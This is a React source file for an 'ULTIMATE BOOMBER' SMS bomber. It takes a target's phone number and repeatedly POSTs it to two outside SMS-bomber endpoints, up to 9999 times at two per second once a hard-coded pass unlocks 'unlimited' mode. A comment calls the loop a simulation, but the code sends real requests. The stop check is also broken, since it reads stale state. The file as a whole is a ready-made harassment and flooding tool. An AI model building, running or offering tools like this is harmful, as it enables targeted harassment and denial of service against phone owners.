import React, { useState, useEffect } from 'react';

const ULTIMATE_PASS = "PROVIDER_1_KEY";

const SMSBomber = () => {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [amount, setAmount] = useState(10);
  const [pass, setPass] = useState('');
  const [isUnlimited, setIsUnlimited] = useState(false);
  const [isAttacking, setIsAttacking] = useState(false);
  const [status, setStatus] = useState('Ready to Attack');

  // API Endpoints
  const apiLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  const handleAttack = async () => {
    if (!phoneNumber) return alert("Please enter a number!");
    
    setIsAttacking(true);
    setStatus('Initializing Attack...');

    // Logic for Normal vs Ultimate
    let attackCount = isUnlimited ? 9999 : parseInt(amount);
    let intervalSpeed = isUnlimited ? 500 : 1000; // 500ms for 2 SMS per sec if unlimited

    for (let i = 0; i < attackCount; i++) {
      if (!isAttacking) break; // Stop if button clicked again

      // Triggering both APIs simultaneously
      apiLinks.forEach(async (url) => {
        try {
          // Note: In a real scenario, you'd send a POST request with payload
          // This is a simulation of the force trigger
          await fetch(url, {
            method: 'POST',
            body: JSON.stringify({ number: phoneNumber, count: 1 }),
            headers: { 'Content-Type': 'application/json' }
          });
        } catch (err) {
          console.error("API Error:", err);
        }
      });

      // Progress simulation
      if (i % 5 === 0) setStatus(`Sending... ${i}/${attackCount}`);
      
      // Wait for interval
      await new Promise(resolve => setTimeout(resolve, intervalSpeed));
    }
    
    setStatus('Attack Completed/Stopped');
    setIsAttacking(false);
  };

  return (
    <div className="min-h-screen bg-black text-red-500 flex flex-col items-center justify-center p-5 font-mono">
      {/* Glitch Effect Title */}
      <h1 className="text-5xl font-bold mb-10 glitch-text text-center uppercase tracking-widest">
        ULTIMATE BOOMBER
      </h1>

      <div className="bg-zinc-900 p-8 rounded-lg border border-red-600 shadow-[0_0_20px_rgba(255,0,0,0.5)] w-full max-w-md">
        <label className="block mb-2">Target Number:</label>
        <input 
          type="text" 
          placeholder="+8801xxxxxxxxx"
          className="w-full p-2 mb-4 bg-black border border-red-900 text-white rounded focus:outline-none focus:border-red-500"
          value={phoneNumber}
          onChange={(e) => setPhoneNumber(e.target.value)}
        />

        {!isUnlimited ? (
          <>
            <label className="block mb-2">SMS Amount (Max 100):</label>
            <input 
              type="number" 
              max="100"
              className="w-full p-2 mb-4 bg-black border border-red-900 text-white rounded"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
            />
            <p className="text-xs text-gray-500 mb-4 italic">ENTER ultimate pass for unlimited sms attempt</p>
            <input 
              type="password" 
              placeholder="Enter Pass"
              className="w-full p-2 mb-4 bg-black border border-red-900 text-white rounded text-sm"
              value={pass}
              onChange={(e) => setPass(e.target.value)}
            />
          </>
        ) : (
          <div className="mb-4 animate-pulse">
            <p className="text-green-500 font-bold">ULTIMATE MODE ACTIVE (2 SMS/sec)</p>
            <p className="text-xs text-gray-400">24H Session Active</p>
          </div>
        )}

        <button 
          onClick={handleAttack}
          className={`w-full py-3 font-bold text-xl transition-all duration-300 ${isAttacking ? 'bg-red-800' : 'bg-red-600 hover:bg-red-500'} text-white rounded mb-4 shadow-lg`}
        >
          {isAttacking ? 'STOP BOOMING' : 'ATTACK'}
        </button>

        <div className="text-center text-sm mt-4">
          <p className="text-gray-400">Status: <span className="text-white">{status}</span></p>
        </div>
      </div>

      {/* Pass Unlock Logic Observer */}
      {pass === ULTIMATE_PASS && !isUnlimited && (
        <button 
          onClick={() => setIsUnlimited(true)}
          className="mt-6 text-green-500 underline text-sm"
        >
          Unlock Unlimited Access
        </button>
      )}

      <style jsx>{`
        .glitch-text {
          position: relative;
          color: #ff0000;
          text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #ffcb00;
          animation: glitch 725ms infinite;
        }
        @keyframes glitch {
          0% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #ffcb00; }
          15% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #ffcb00; }
          100% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #ffcb00; }
        }
      `}</style>
    </div>
  );
};

export default SMSBomber;
